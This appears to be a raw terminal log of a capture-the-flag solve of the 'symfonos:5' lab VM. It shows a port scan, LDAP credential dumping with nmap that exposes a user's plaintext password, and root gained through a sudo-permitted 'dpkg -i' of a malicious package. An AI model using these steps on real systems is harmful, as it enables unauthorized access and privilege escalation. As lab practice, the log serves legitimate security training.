@@ -1,0 +1,173 @@
+root@ap:~/Scrivania/CTF/Symfonos_5# nmap -A -p- 192.168.43.198
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-15 16:47 CET
+Nmap scan report for symfonos5 (192.168.43.198)
+Host is up (0.00052s latency).
+Not shown: 65531 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
+|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
+|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
+636/tcp open  ldapssl?
+MAC Address: 08:00:27:C9:F1:47 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.52 ms symfonos5 (192.168.43.198)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 76.36 seconds
+
+
+
+Start BurpSuite:
+Proxy --> Repeater
+
+
+admin:qMDdyZh3cT6eeAWD
+
+
+
+root@ap:~/Scrivania/CTF/Symfonos_5# nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"' 192.168.43.198
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-15 17:40 CET
+Nmap scan report for symfonos5 (192.168.43.198)
+Host is up (0.00034s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-search: 
+|   Context: dc=symfonos,dc=local
+|     dn: dc=symfonos,dc=local
+|         objectClass: top
+|         objectClass: dcObject
+|         objectClass: organization
+|         o: symfonos
+|         dc: symfonos
+|     dn: cn=admin,dc=symfonos,dc=local
+|         objectClass: simpleSecurityObject
+|         objectClass: organizationalRole
+|         cn: admin
+|         description: LDAP administrator
+|         userPassword: {SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm
+|     dn: uid=zeus,dc=symfonos,dc=local
+|         uid: zeus
+|         cn: zeus
+|         sn: 3
+|         objectClass: top
+|         objectClass: posixAccount
+|         objectClass: inetOrgPerson
+|         loginShell: /bin/bash
+|         homeDirectory: /home/zeus
+|         uidNumber: 14583102
+|         gidNumber: 14564100
+|         userPassword: cetkKf4wCuHC9FET
+|         mail: zeus@symfonos.local
+|_        gecos: Zeus User
+MAC Address: 08:00:27:C9:F1:47 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
+
+###################################################
+|         userPassword: cetkKf4wCuHC9FET
+|         mail: zeus@symfonos.local
+|_        gecos: Zeus User
+###################################################
+
+
+
+zeus@symfonos5:~$ sudo -u root /usr/bin/dpkg -i exploit_1.0_amd64.deb 
+Selecting previously unselected package exploit.
+(Reading database ... 53057 files and directories currently installed.)
+Preparing to unpack exploit_1.0_amd64.deb ...
+root@symfonos5:/# 
+root@symfonos5:/# 
+root@symfonos5:/# 
+root@symfonos5:/# 
+root@symfonos5:/# 
+root@symfonos5:/# ls
+bin   etc	  initrd.img.old  lib64       media  pack  run	 sys  var
+boot  home	  lib		  libx32      mnt    proc  sbin  tmp  vmlinuz
+dev   initrd.img  lib32		  lost+found  opt    root  srv	 usr  vmlinuz.old
+root@symfonos5:/# 
+root@symfonos5:/# 
+root@symfonos5:/# 
+root@symfonos5:/# ls -la
+total 72
+drwxr-xr-x  19 root root  4096 Jan  6 18:22 .
+drwxr-xr-x  19 root root  4096 Jan  6 18:22 ..
+lrwxrwxrwx   1 root root     7 Jan  3 06:03 bin -> usr/bin
+drwxr-xr-x   3 root root  4096 Jan  3 06:06 boot
+drwxr-xr-x  16 root root  3040 Feb 15  2020 dev
+drwxr-xr-x  78 root root  4096 Feb 15  2020 etc
+drwxr-xr-x   3 root root  4096 Jan  3 06:06 home
+lrwxrwxrwx   1 root root    30 Jan  3 06:03 initrd.img -> boot/initrd.img-4.19.0-6-amd64
+lrwxrwxrwx   1 root root    30 Jan  3 06:03 initrd.img.old -> boot/initrd.img-4.19.0-6-amd64
+lrwxrwxrwx   1 root root     7 Jan  3 06:03 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Jan  3 06:03 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Jan  3 06:03 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Jan  3 06:03 libx32 -> usr/libx32
+drwx------   2 root root 16384 Jan  3 06:03 lost+found
+drwxr-xr-x   3 root root  4096 Jan  3 06:03 media
+drwxr-xr-x   2 root root  4096 Jan  3 06:03 mnt
+drwxr-xr-x   3 root root  4096 Jan  4 01:38 opt
+drwxr-xr-x   2 root root  4096 Jan  6 18:23 pack
+dr-xr-xr-x 101 root root     0 Feb 15 10:47 proc
+drwx------   4 root root  4096 Jan  6 18:37 root
+drwxr-xr-x  18 root root   580 Feb 15 10:48 run
+lrwxrwxrwx   1 root root     8 Jan  3 06:03 sbin -> usr/sbin
+drwxr-xr-x   2 root root  4096 Jan  3 06:03 srv
+dr-xr-xr-x  13 root root     0 Feb 15  2020 sys
+drwxrwxrwt   8 root root  4096 Feb 15  2020 tmp
+drwxr-xr-x  14 root root  4096 Jan  4 01:38 usr
+drwxr-xr-x  11 root root  4096 Jan  3 06:03 var
+lrwxrwxrwx   1 root root    27 Jan  3 06:03 vmlinuz -> boot/vmlinuz-4.19.0-6-amd64
+lrwxrwxrwx   1 root root    27 Jan  3 06:03 vmlinuz.old -> boot/vmlinuz-4.19.0-6-amd64
+root@symfonos5:/# 
+root@symfonos5:/# 
+root@symfonos5:/# 
+root@symfonos5:/# cd root
+root@symfonos5:~# ls
+proof.txt
+root@symfonos5:~# cat proof.txt 
+ 
+		    Congrats on rooting symfonos:5!
+  
+                                   ZEUS
+              *      .            dZZZZZ,       .          *
+                                 dZZZZ  ZZ,
+     *         .         ,AZZZZZZZZZZZ  `ZZ,_          *
+                    ,ZZZZZZV'      ZZZZ   `Z,`\
+                  ,ZZZ    ZZ   .    ZZZZ   `V
+        *      ZZZZV'     ZZ         ZZZZ    \_              .
+.              V   l   .   ZZ        ZZZZZZ          .
+               l    \       ZZ,     ZZZ  ZZZZZZ,
+   .          /            ZZ l    ZZZ    ZZZ `Z,
+                          ZZ  l   ZZZ     Z Z, `Z,            *
+                .        ZZ      ZZZ      Z  Z, `l
+                         Z        ZZ      V  `Z   \
+                         V        ZZC     l   V
+           Z             l        V ZR        l      .
+            \             \       l  ZA
+                            \         C          C
+                                  \   K   /    /             K
+                          A    \   \  |  /  /              /
+                           \        \\|/ /  /
+   __________________________________\|/_________________________
+	    Contact me via Twitter @zayotic to give feedback!
+
+root@symfonos5:~# 
+
+
+
+
